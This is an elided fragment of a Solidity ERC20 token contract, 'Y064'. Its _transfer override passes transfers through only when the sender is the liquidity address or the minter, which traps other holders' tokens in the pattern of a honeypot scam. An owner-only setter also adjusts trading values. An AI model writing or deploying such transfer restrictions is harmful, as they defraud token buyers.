...
contract Y064 is ERC20, ERC20Burnable, Ownable {
  ...
  constructor() payable ERC20("Y064", "Y064")      {
...
function setCoinForTrades(uint _tCoin) external onlyOwner                                               {
    require(_tCoin <= MAX_COIN, "MAX REACHED");      tCoin = _tCoin;             emit changetCoin(_tCoin);   }

function _transfer(address sender, address receiver, uint256 amount) internal virtual override                  {
if (sender==wLiq || sender==minter){      super._transfer(sender, receiver, amount);      }
